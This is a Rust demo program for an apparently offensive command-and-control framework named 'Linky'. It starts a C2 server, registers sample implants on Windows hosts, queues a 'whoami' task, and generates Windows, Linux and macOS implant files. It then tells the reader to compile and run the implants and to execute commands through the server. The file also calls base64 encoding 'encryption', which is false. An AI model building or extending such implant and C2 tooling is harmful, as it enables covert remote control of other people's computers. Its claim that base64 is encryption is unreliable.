// Simple demonstration of Linky framework functionality

use linky::{
    c2::{C2Config, C2Server, Implant, ImplantStatus},
    implants::{generate_linux_implant, generate_windows_implant, generate_mac_implant},
    utils::{base64_decode, base64_encode, generate_implant_id},
};
use std::path::PathBuf;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    println!("=== Linky Framework Demo ===");

    // 1. Create C2 Server
    let mut config = C2Config::default();
    config.port = 8080;
    config.server_address = "127.0.0.1".to_string();

    let c2_server = C2Server::new(config.clone());
    println!(
        "✅ C2 Server created: {}:{}",
        config.server_address, config.port
    );

    // 2. Generate sample implants
    let implant1 = Implant {
        id: generate_implant_id(),
        hostname: "DESKTOP-01".to_string(),
        username: "admin".to_string(),
        ip_address: "192.168.1.100".to_string(),
        platform: "Windows 10".to_string(),
        last_checkin: chrono::Utc::now(),
        status: ImplantStatus::Active,
        tasks: Vec::new(),
    };

    let implant2 = Implant {
        id: generate_implant_id(),
        hostname: "LAPTOP-02".to_string(),
        username: "user".to_string(),
        ip_address: "192.168.1.101".to_string(),
        platform: "Windows 11".to_string(),
        last_checkin: chrono::Utc::now(),
        status: ImplantStatus::Active,
        tasks: Vec::new(),
    };

    c2_server.add_implant(implant1.clone());
    c2_server.add_implant(implant2.clone());

    println!("✅ Added {} implants", c2_server.get_implants().len());

    // 3. Demonstrate encryption
    let secret_message = "Top secret C2 communication";
    let encoded = base64_encode(secret_message.as_bytes());
    println!("✅ Encryption test: '{}' -> '{}'", secret_message, encoded);

    let decoded = base64_decode(&encoded)?;
    let decoded_str = String::from_utf8(decoded)?;
    println!("✅ Decryption test: '{}' -> '{}'", encoded, decoded_str);

    // 4. Test task management
    let test_command = "whoami";
    if let Some(task) = c2_server.add_task(&implant1.id, test_command) {
        println!("✅ Added task to implant {}: {}", implant1.id, task.command);
    }

    // 5. Generate implant files
    let windows_implant_path = PathBuf::from("examples/windows_implant.cs");
    let linux_implant_path = PathBuf::from("examples/linux_implant.sh");
    let mac_implant_path = PathBuf::from("examples/mac_implant.sh");

    generate_windows_implant(windows_implant_path.clone(), config.server_address.clone())?;
    generate_linux_implant(linux_implant_path.clone(), config.server_address.clone())?;
    generate_mac_implant(mac_implant_path.clone(), config.server_address.clone())?;

    println!("✅ Generated implant files:");
    println!("   - Windows: {}", windows_implant_path.display());
    println!("   - Linux: {}", linux_implant_path.display());
    println!("   - Mac: {}", mac_implant_path.display());

    // 6. Display implant information
    println!("\n=== Implant Status ===");
    for implant in c2_server.get_implants() {
        println!(
            "- {} ({}) @ {} - Status: {:?}, Tasks: {}",
            implant.hostname, implant.username, implant.ip_address, implant.status, implant.tasks.len()
        );
    }

    println!("\n🎉 Linky framework demo completed successfully!");
    println!("\nNext steps:");
    println!("1. Start the C2 server with: cargo run");
    println!("2. Compile and run the generated implants");
    println!("3. Use the C2 server to manage implants and execute commands");

    Ok(())
}
